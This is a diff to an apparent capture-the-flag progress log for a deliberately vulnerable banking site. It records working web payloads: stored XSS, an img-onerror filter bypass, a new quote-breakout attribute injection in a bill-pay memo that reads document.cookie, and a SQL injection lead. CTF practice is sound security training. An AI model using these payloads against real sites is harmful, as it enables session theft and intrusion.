@@ -1,7 +1,7 @@
 # DarkMoney CTF — Status & Solutions
 
-**Competition:** Schwab 2026 Advanced | **Team score:** 1910 | **Team rank:** improving  
-**Progress:** 14 of 37 challenges solved  
+**Competition:** Schwab 2026 Advanced | **Team score:** 2160 | **Team rank:** improving  
+**Progress:** 15 of 37 challenges solved  
 **Target:** https://50-18-145-16-darkmoneyprod.vulnerablesites.net  
 **Tracker:** https://crwd-ctrl.net/d9e8f33f-db5e-405c-8236-499d2f0df794  
 **Account:** Alice Morgan (user ID 1, clientId DM-CLIENT-A9F131)
@@ -26,12 +26,20 @@
 | Say It Again | Trex | 100 | Stored XSS — `POST /api/transactions` with XSS in `remarks`, then `GET /api/transactions/statement/print` renders it |
 | By Any Other Name | Trex | 200 | Stored XSS in account displayName — `POST /api/accounts` with `displayName: '<script>alert(1)</script>'` |
 | The Prophecy That Speaks | Trex | 200 | XSS filter bypass — `POST /api/oracle/markets` with `<img src=x onerror=alert(1)>` in description (script tag blocked but img onerror bypasses V1 filter) |
+| Between the Lines | Trex | 250 | HTML attribute injection via unescaped `"` in bill-pay memo — `$A()` renders `title="${memo}"` without escaping quotes; payload: `x" onmouseover="alert(document.cookie)` |
 
-**Total earned: 1910 pts**
+**Total earned: 2160 pts**
 
 ---
 
 ## 🔄 IN PROGRESS (incomplete challenges)
+
+### Between the Lines — 250 pts
+- `$A(e.memo)` function creates `<span class="memo-note" title="${n}">${s}</span>`
+- `n` only escapes `&`, `<`, `>` — NOT `"` — so `"` in memo breaks out of title attribute
+- Payload: `x" onmouseover="alert(document.cookie)` → creates `title="x" onmouseover="alert(document.cookie)"`
+- `POST /api/bill-pay/payments` with memo payload, then navigate to `/bill-pay/payments/{id}`
+- crwd-ctrl auto-detected when payment detail page loaded
 
 ### Honest Answers (Alpaca)
 - **Vector:** SQL injection in transaction search field
